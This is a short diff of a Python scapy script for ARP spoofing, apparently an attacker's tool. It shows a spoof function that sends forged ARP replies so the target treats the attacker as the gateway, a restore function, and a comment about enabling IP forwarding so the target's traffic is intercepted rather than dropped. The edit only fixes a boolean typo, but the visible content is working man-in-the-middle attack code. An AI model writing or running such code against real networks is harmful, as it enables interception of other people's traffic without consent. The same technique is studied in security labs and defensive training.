@@ -36,7 +36,7 @@ def spoof(target_ip, spoof_ip):
 	target_mac = get_mac(target_ip)
 	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	# Tell the target computer that we are the Gateway router
-	scapy.send(packet, verbose=false)
+	scapy.send(packet, verbose=False)
 
 # Restore - Both Target and Gateway
 def restore(dest_ip, src_ip):
@@ -44,7 +44,7 @@ def restore(dest_ip, src_ip):
 	# packet need source mac address this time, since it isn't attacker mac address
 	src_mac = get_mac(src_ip)
 	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
-	scapy.send(packet, count=4, verbose=false)
+	scapy.send(packet, count=4, verbose=False)
 
 # Don't forget to run `echo 1 > /proc/sys/net/ipv4/ip_forward` in a separate terminal window to enable ip forwarding. Otherwise you DoS the target machine
 options = c_arg()
